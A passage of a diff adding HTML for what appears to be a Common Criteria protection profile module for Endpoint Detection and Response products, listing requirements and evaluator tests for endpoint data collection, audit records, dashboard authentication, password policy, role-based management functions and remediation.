+            <div class="element"><div class="reqid" id="FAU_COL_EXT.1.1"><a class="abbr" href="#FAU_COL_EXT.1.1">FAU_COL_EXT.1.1</a></div><div class="reqdesc">
+              The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall collect the following minimum set of endpoint
+                data from a Host Agent: <ol type="a">
+                  <li>Operating System (<abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr>) version, architecture, and <abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr> Address,</li>
+                  <li>Privileged and unprivileged endpoint account login activity,</li>
+                  <li>Process creation,</li>
+                  <li>Libraries and modules loaded by processes,</li>
+                  <li>Filenames and [<b>assignment</b>: <span class="assignable-content">other metadata</span>] of files created and [<b>assignment</b>: <span class="assignable-content">other activities performed to files</span>] on persistent storage,</li>
+                  <li>[<b>assignment</b>: <span class="assignable-content">Other host data</span>]<a href="#period_136" id="period_136">. </a></li>
+                </ol>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note">The intent of this requirement is to specify the minimum set
+                of endpoint data that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> must be capable of collecting<a href="#period_137" id="period_137">. </a>The assignments may be empty, a single item, or multiple items<a href="#period_138" id="period_138">. </a></span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall verify that all supported endpoint event data types are described<a href="#period_139" id="period_139">. </a><p></p>
+                <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance and ensure that it
+                  lists all of the collectable types of endpoint event data<a href="#period_140" id="period_140">. </a><p></p>
+                <div class="eacategory">Tests</div>The evaluator shall perform the following tests:
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall verify the <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr> version, architecture, and <abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr> address of
+                    a system managed by a Host Agent against the data reported to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_141" id="period_141">. </a></li>
+                    <li><b>Test 2: </b>The evaluator shall log in to a system managed by a Host Agent with two separate
+                    accounts and verify that the activity is accurately reported to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_142" id="period_142">. </a></li>
+                    <li><b>Test 3: </b>The evaluator shall run a known user application provided on the platform <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr> and verify
+                    that subsequent process creation and module loading is accurately reported to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_143" id="period_143">. </a></li>
+                    <li><b>Test 4: </b>The evaluator shall create a new non-empty document within persistent storage and verify
+                    that the activity is accurately reported to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_144" id="period_144">. </a></li>
+                    <li><b>Test 5: </b>The evaluator shall perform an action that causes an event 
+                      to occur for all items in the assignment and verify the activity is reported to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_145" id="period_145">. </a></li>
+                  </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+          
+          
+        
+          
+          <div class="comp" id="FAU_GEN.1/EDR"><h4>FAU_GEN.1/EDR Audit Data Generation</h4>
+            
+            
+            
+            
+            
+            
+
+         
+            <div class="element"><div class="reqid" id="FAU_GEN.1.1/EDR"><a class="abbr" href="#FAU_GEN.1.1/EDR">FAU_GEN.1.1/EDR</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall generate an audit record of the following auditable events: 
+                <ol type="a">
+                  <li><del>Start-up and shutdown of the audit functions;</del></li>
+                  <li>All auditable events for the [<i>not specified</i>] level of audit; and</li>
+                </ol>
+                [<i>
+                  <ol type="a">
+                <li><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard log in activity;</li>
+                  <li>Remediation commands sent to a Host Agent, affected endpoint, or network
+                    devices;</li>
+                  <li><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> configuration changes;</li>
+                  <li>[<b>assignment</b>: <span class="assignable-content">Other auditable events</span>]</li>
+                  </ol>
+                </i>]<a href="#period_146" id="period_146">. </a>              
+
+              
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note">The intent of this requirement is to specify the minimum set
+                of audit records generated about actions on the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_147" id="period_147">. </a></span></div>
+              
+            </div></div>
+            
+            <div class="element"><div class="reqid" id="FAU_GEN.1.2/EDR"><a class="abbr" href="#FAU_GEN.1.2/EDR">FAU_GEN.1.2/EDR</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall record within each audit record at least the following information: 
+                <ol type="a">
+                  <li>Date and time of the event,</li>
+                  <li>Type of event,</li>
+                  <li>Subject identity,</li>
+                  <li>Outcome (success or failure) of the event,</li>
+                  <li>For each audit type, based on the auditable event definitions of the functional components included in the <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr>/<abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr>, [<b>assignment</b>: <span class="assignable-content">Other audit relevant information</span>]<a href="#period_148" id="period_148">. </a></li>
+                </ol>
+            
+   
+            <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> This requirement outlines the information to be included in audit records<a href="#period_149" id="period_149">. </a>All audits must 
+              contain at least the information mentioned in <a href="#FAU_GEN.1.2/EDR">FAU_GEN.1.2/EDR</a>, but may contain more information 
+              which can be assigned<a href="#period_150" id="period_150">. </a>
+              </span></div>
+            <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+              <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall check the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> and ensure that it lists all of the auditable events claimed in the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr><a href="#period_151" id="period_151">. </a>
+                The evaluator shall check to make sure that every audit event type specified by the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> is described in the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr><a href="#period_152" id="period_152">. </a><br><br>
+                The evaluator shall check the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> and ensure that it provides a format for audit records<a href="#period_153" id="period_153">. </a>
+                Each audit record format type must be covered, along with a brief description of each field<a href="#period_154" id="period_154">. </a>              <p></p>                            
+              
+              <div class="eacategory">Guidance</div> The evaluator shall check the administrative guide and ensure that it lists all of the auditable events claimed in the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr><a href="#period_155" id="period_155">. </a>
+                The evaluator shall check to make sure that every audit event type mandated by the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr> is described<a href="#period_156" id="period_156">. </a><br><br> 
+                The evaluator shall examine the administrative guide and make a determination of which 
+                commands are related to the configuration (including enabling or disabling) 
+                of the mechanisms implemented in the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> that are necessary to enforce the 
+                requirements specified in the <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_157" id="period_157">. </a>The evaluator shall document the methodology or 
+                approach taken while determining which actions in the administrative guide are security relevant with 
+                respect to this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr><a href="#period_158" id="period_158">. </a>The evaluator may perform this activity as part of the activities 
+                associated with ensuring the AGD_OPE guidance  satisfies the requirements<a href="#period_159" id="period_159">. </a><br><br>
+                The evaluator shall check the administrative guide and ensure that it provides a format for audit records<a href="#period_160" id="period_160">. </a>
+                Each audit record format type must be covered, along with a brief description of each field<a href="#period_161" id="period_161">. </a>The evaluator shall 
+                check to make sure that the description of the fields contains the information required in <a href="#FAU_GEN.1.2/EDR">FAU_GEN.1.2/EDR</a><a href="#period_162" id="period_162">. </a>              <p></p>
+              <div class="eacategory">Tests</div>The evaluator shall perform the following tests:
+                <ul>
+                  <li><b>Test 1: </b>The evaluator shall login to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard and verify that audit
+                    log data describing the activity is recorded<a href="#period_163" id="period_163">. </a></li>
+                  <li><b>Test 2: </b>The evaluator shall issue a valid remediation command provided by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> to
+                    a Host Agent and verify that audit log data describing the activity is recorded on the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard<a href="#period_164" id="period_164">. </a></li>
+                  <li><b>Test 3: </b>The evaluator shall change a non-destructive <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> configuration option within the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management
+                    dashboard, change it back to the original setting, and verify that the audit log data describing
+                    the activity is recorded<a href="#period_165" id="period_165">. </a></li>
+                  <li><b>Test 4: </b>The evalutor shall perform the action to generate all other auditable 
+                    events listed in the assignement and verify the activity is recorded<a href="#period_166" id="period_166">. </a></li>
+                </ul>
+                When verifying the test results from <a href="#FAU_GEN.1.1/EDR">FAU_GEN.1.1/EDR</a>, the evaluator shall ensure the audit records generated during 
+                testing match the format specified in the administrative guide, and that the fields in each audit record have the proper entries<a href="#period_167" id="period_167">. </a>                <br><br> 
+                Note that the testing here can be accomplished in conjunction with the testing of the security mechanisms directly<a href="#period_168" id="period_168">. </a>
+                For example, testing performed to ensure that the administrative guidance provided is correct verifies that AGD_OPE.1 
+                is satisfied and should address the invocation of the administrative actions that are needed to verify the audit records 
+                are generated as expected<a href="#period_169" id="period_169">. </a><br><br>
+              
+            </i></div></div>
+          </div></div>
+          </div>
+
+
+
+
+
+
+
+        <h3 class="indexable" data-level="3" id="fia">5.2.2 Identification and Authentication (FIA)</h3>
+          
+          <div class="comp" id="FIA_AUT_EXT.1"><h4>FIA_AUT_EXT.1 Dashboard Authentication Mechanisms</h4>
+            
+            
+            
+            
+            
+            
+            
+            <div class="element"><div class="reqid" id="FIA_AUT_EXT.1.1"><a class="abbr" href="#FIA_AUT_EXT.1.1">FIA_AUT_EXT.1.1</a></div><div class="reqdesc">
+               The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall 
+                [<b>selection</b>: <ul><li><i>leverage the platform for authentication</i>, </li><li><i>provide authentication based on username/password and [<b>selection</b>: <ul><li><i>authentication with external smart card and PIN</i>, </li><li><i>no other factors</i></li></ul>]</i></li></ul>] to support logins to any management dashboard or <abbr class="dyn-abbr"><a href="#abbr_API">API</a></abbr><a href="#period_170" id="period_170">. </a>
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note">The selection specifies if Smartcards are also supported, one selection must be made<a href="#period_171" id="period_171">. </a></span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to ensure that it describes how user authentication is performed<a href="#period_172" id="period_172">. </a> 
+                The evaluator shall verify that the authorization methods listed in the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> are specified and included in the requirements in the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr><a href="#period_173" id="period_173">. </a><p></p>
+                <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on configuring any supported authentication mechanisms and any support for 
+                  multifactor authentication<a href="#period_174" id="period_174">. </a><p></p>
+                <div class="eacategory">Tests</div>
+                  <ul>
+                    <li><b>Test 1: </b>Conditional: If "provide the following authentication mechanisms" is selected, 
+                      the evaluator shall create an account with a username and password, verifying
+                      that login authentication is case-sensitive<a href="#period_175" id="period_175">. </a>If additional factors are provided, each
+                      factor shall be tested for login access with strictly unanimous authentication for those
+                      enabled<a href="#period_176" id="period_176">. </a>The evaluator shall verify that login access is granted for correct credentials
+                      and denied in cases of incorrect credentials across available factors<a href="#period_177" id="period_177">. </a></li>
+                    <li><b>Test 2: </b>
+                      Conditional: If "leverage the platform" is selected, the evaluator shall create an account following the platform rules<a href="#period_178" id="period_178">. </a>
+                      If additional factors are provided, each
+                      factor shall be tested for login access with strictly unanimous authentication for those
+                      enabled<a href="#period_179" id="period_179">. </a>The evaluator shall verify that login access is granted for correct credentials
+                      and denied in cases of incorrect credentials across available factors<a href="#period_180" id="period_180">. </a></li>
+                  </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+
+  
+          
+          
+
+          <div class="comp" id="FIA_PWD_EXT.1"><h4>FIA_PWD_EXT.1 Password Authentication</h4>
+            
+            
+            
+            
+            
+            
+            
+            <div class="element"><div class="reqid" id="FIA_PWD_EXT.1.1"><a class="abbr" href="#FIA_PWD_EXT.1.1">FIA_PWD_EXT.1.1</a></div><div class="reqdesc">
+              The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall support the following for the Password
+                Authentication Factor: <ol>
+                  <li>Passwords shall be able to be composed of any combination of [<b>selection</b>: <i>upper and lower case letters</i>, <i>[<b>assignment</b>: <span class="assignable-content">a character set of at least 52
+                        characters</span>]</i>], numbers, and special characters: [<b>selection</b>: <i>"!"</i>, <i>"@"</i>, <i>"#"</i>, <i>"$"</i>, <i>"%"</i>, <i>"^"</i>, <i>"&amp;"</i>, <i> "*"</i>, <i>"("</i>, <i>")"</i>, <i>[<b>assignment</b>: <span class="assignable-content">other characters</span>]</i>],
+                  </li>
+                  <li>Password length up to [<b>assignment</b>: <span class="assignable-content">an integer greater than or equal to
+                      64</span>] characters shall be supported<a href="#period_181" id="period_181">. </a></li>
+                </ol>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> The <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> author selects the character set:
+                either the upper and lower case Basic Latin letters or another assigned character
+                set containing at least 52 characters<a href="#period_182" id="period_182">. </a>The assigned character set must be well
+                defined: either according to an international encoding standard (such as Unicode) or
+                defined in the assignment by the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> author<a href="#period_183" id="period_183">. </a>The <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr>
+                 author also selects the special characters that are supported by the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>;
+                 they may optionally list additional special characters supported
+                using the assignment<a href="#period_184" id="period_184">. </a></span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall verify the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> includes all the supported characters, rules, and limitations used by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and that they meet the requirements of the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr><a href="#period_185" id="period_185">. </a><p></p>
+                <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on default password policy<a href="#period_186" id="period_186">. </a><p></p>
+                <div class="eacategory">Tests</div>The evaluator shall perform the following tests:
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall verify that passwords up to 64 characters are supported<a href="#period_187" id="period_187">. </a></li>
+                    <li><b>Test 2: </b> The evaluator shall verify that password composition rules present in operational guidance
+                      are enforced<a href="#period_188" id="period_188">. </a>While the evaluator is not required (nor is it feasible) to test all possible
+                      composition rules, the evaluator shall ensure that all characters are supported, and rule characteristics
+                      listed in the requirement are enforced<a href="#period_189" id="period_189">. </a></li>
+                  </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+          
+          
+
+        <h3 class="indexable" data-level="3" id="fmt">5.2.3 Security Management (FMT)</h3>
+          <div class="comp" id="FMT_SMF.1/ENDPOINT"><h4>FMT_SMF.1/ENDPOINT Specification of Management Functions (EDR Management of EDR)</h4>
+            
+          <div class="element"><div class="reqid" id="FMT_SMF.1.1/ENDPOINT"><a class="abbr" href="#FMT_SMF.1.1/ENDPOINT">FMT_SMF.1.1/ENDPOINT</a></div><div class="reqdesc">
+            <b>Refinement:</b>  The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall be capable of performing the following
+                management functions: <br>
+                <table class="mfs" style="width: 100%;"><tr class="header"><td>Management Function</td><td>Administrator</td><td>SOC Analyst</td><td>Read-Only User</td></tr><tr><td>Configure the amount of time to retain data collected by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>
+                        [<b>assignment</b>: <span class="assignable-content">time frame to retain data</span>]
+                    </td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td> Obtain or display the connectivity status of a Host Agent </td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td></tr><tr><td> Define a configurable
+                      denylist of [<b>selection</b>: <i>filenames</i>, <i>folders</i>, <i>file hashes</i>, <i>[<b>assignment</b>: <span class="assignable-content">other factors</span>]</i>]
+                    </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td> Configure visual suppression of incident alerts based on a configurable
+                      denylist of [<b>selection</b>: <i>filenames</i>, <i>folders</i>, <i>file hashes</i>, <i>[<b>assignment</b>: <span class="assignable-content">other factors</span>]</i>]
+                    </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr></table>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> This requirement captures all the configuration
+                functionality the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> provides the administrator to configure the
+                <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_190" id="period_190">. </a>
+              
+                <p></p>
+                Chart legend: M = Mandatory, O = Optional, - = N/A</span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall verify the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> contains a list of roles and what functions they can perform<a href="#period_191" id="period_191">. </a> 
+                  The evaluator shall verify the list matches the chart in the requirement<a href="#period_192" id="period_192">. </a><p></p>
+                <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance to verify that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> has
+                  documented capabilities to perform the management functions<a href="#period_193" id="period_193">. </a><p></p>
+                <div class="eacategory">Tests</div>The evaluator shall perform the below tests with each role, 
+                  verifying each role is denied or can complete the action below as specified by the chart in the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr>:
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall configure the amount of time to retain collected <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> data
+                    to a time frame in which existing data will be made unavailable and verify that the
+                    data is no longer accessible through the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard<a href="#period_194" id="period_194">. </a></li>
+                    <li><b>Test 2: </b>The evaluator shall logically or physically inhibit the network communications
+                    between a managed endpoint system and the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> server and verify that the inhibited or halted
+                    connectivity status of the Host Agent is recognized on the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard<a href="#period_195" id="period_195">. </a></li>
+                    <li><b>Test 3: </b>The evaluator shall use a file that triggers an incident alert to test the suppression
+                    of such alerts for that specific file<a href="#period_196" id="period_196">. </a>Upon confirming the creation of incident alerts on access
+                    to the file, the evaluator shall configure suppression of the alert for each available
+                    suppression denylist file or metadata characteristic and verify that incident alerts are
+                    categorized as suppressed, hidden, unavailable, or never created<a href="#period_197" id="period_197">. </a></li>
+                    <li><b>Test 4: </b>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement<a href="#period_198" id="period_198">. </a></li>
+                  </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+          
+  
+          <div class="comp" id="FMT_SMF.1/HOST"><h4>FMT_SMF.1/HOST Specification of Management Functions (EDR Management of Host Agent)</h4>
+            
+            <div class="element"><div class="reqid" id="FMT_SMF.1.1/HOST"><a class="abbr" href="#FMT_SMF.1.1/HOST">FMT_SMF.1.1/HOST</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall be capable of performing the following functions <b>that control
+                behavior of the Host Agent</b>:<br>
+                <table class="mfs" style="width: 100%;"><tr class="header"><td>Management Function</td><td>Administrator</td><td>SOC Analyst</td><td>Read-Only User</td></tr><tr><td>Configure the time frame for sending Host Agent data to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>
+                        [<b>assignment</b>: <span class="assignable-content">list of configurable time frames</span>]
+                    </td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td>Assign a label or tag to categorize or group individual endpoint systems </td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr></table>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note">This requirement captures all the configuration
+                functionality the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> provides the administrator to configure the
+                <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> Host Agents<a href="#period_199" id="period_199">. </a><p></p>
+              Chart legend: M = Mandatory, O = Optional, - = N/A</span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall verify the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> contains a list of roles and what functions they can perform<a href="#period_200" id="period_200">. </a> 
+                  The evaluator shall verify the list matches the chart in the requirement<a href="#period_201" id="period_201">. </a><p></p>
+                <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance to verify that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> has
+                documented capabilities to perform the management functions<a href="#period_202" id="period_202">. </a><p></p>
+                <div class="eacategory">Tests</div>The evaluator shall perform the below tests:
+                 <ul>
+                   <li><b>Test 1: </b>The evaluator shall modify the time frame for sending Host Agent data to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>
+                   and verify that an affected Host Agent is sending data at the intended interval<a href="#period_203" id="period_203">. </a></li>
+                   <li><b>Test 2: </b>The evaluator shall tag or categorize a group of individual endpoint systems and
+                   verify that the tag or categorization persists within the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard for
+                   other users<a href="#period_204" id="period_204">. </a></li>
+                   <li><b>Test 3: </b>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement<a href="#period_205" id="period_205">. </a></li>
+                 </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+          
+          
+          
+          
+          <div class="comp" id="FMT_SMR.1"><h4>FMT_SMR.1 Security Management Roles</h4>
+                    
+            
+            <div class="element"><div class="reqid" id="FMT_SMR.1.1"><a class="abbr" href="#FMT_SMR.1.1">FMT_SMR.1.1</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall maintain the roles [<i>administrator, SOC analyst, read-only
+                user</i>]<a href="#period_206" id="period_206">. </a>            </div></div>
+            <div class="element"><div class="reqid" id="FMT_SMR.1.2"><a class="abbr" href="#FMT_SMR.1.2">FMT_SMR.1.2</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall be able to associate users with roles<a href="#period_207" id="period_207">. </a>            
+            <div class="appnote"><span class="note-header">Application Note: </span><span class="note">The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> will be configured, maintained, and
+                used by different user roles<a href="#period_208" id="period_208">. </a>At a minimum, one administrative role shall be
+                supported, one SOC analyst who can issue remediation commands to host agents, and
+                one read-only user who can only view data<a href="#period_209" id="period_209">. </a><p></p> 
+                The user accounts need not be named literally, but they must have the implication of such roles<a href="#period_210" id="period_210">. </a><p></p>
+              <abbr class="dyn-abbr"><a href="#abbr_CC">CC</a></abbr> Part 2 specifies FIA_UID.1 as a dependency of this requirement because the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> must have some way of identifying users so that they can be associated with management roles<a href="#period_211" id="period_211">. </a>
+              This dependency is implicitly addressed through <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>, which specifies an alternative method of user identification<a href="#period_212" id="period_212">. </a></span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div> The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to verify that it
+                  describes the roles and the powers granted to and limitations of the role<a href="#period_213" id="period_213">. </a><p></p>
+                <div class="eacategory">Guidance</div> The evaluator shall review the operational guidance to ensure that it
+                  contains instructions for administering the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>, which user
+                  roles are supported, and which permissions each role has<a href="#period_214" id="period_214">. </a><p></p>
+                <div class="eacategory">Tests</div>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall verify that the roles of administrator, SOC analyst, and
+                      read-only user are available, creating individual accounts with each
+                      role assigned<a href="#period_215" id="period_215">. </a></li>
+                    <li><b>Test 2: </b>The evaluator shall verify that non-administrator roles are not able to modify
+                      the roles of their own account or those of others<a href="#period_216" id="period_216">. </a></li>
+                    <li><b>Test 3: </b>In the course of performing the testing activities for the evaluation,
+                      the evaluator shall use all supported interfaces, although it is not
+                      necessary to repeat each test involving an administrative action with each
+                      interface<a href="#period_217" id="period_217">. </a>The evaluator shall ensure, however, that each supported method
+                      of administering the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> that conforms to the requirements
+                      of this <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> be tested; for instance, if the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> can be administered through a local hardware interface or
+                      <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr>/<abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr> then both methods of administration must be exercised during the
+                      execution of the test activities<a href="#period_218" id="period_218">. </a></li>
+                    <li><b>Test 4: </b>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement<a href="#period_219" id="period_219">. </a></li>
+                  </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+          
+          
+          
+
+          <div class="comp" id="FMT_SRF_EXT.1"><h4>FMT_SRF_EXT.1 Specification of Remediation Functions</h4>
+            
+            
+            
+            
+            
+            
+            
+            <div class="element"><div class="reqid" id="FMT_SRF_EXT.1.1"><a class="abbr" href="#FMT_SRF_EXT.1.1">FMT_SRF_EXT.1.1</a></div><div class="reqdesc">
+               The <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> shall be capable of performing the following
+                remediation functions: <br>
+                <table class="mfs" style="width: 100%;"><tr class="header"><td>Management Function</td><td>Administrator</td><td>SOC Analyst</td><td>Read-Only User</td></tr><tr><td> Quarantine an endpoint by 
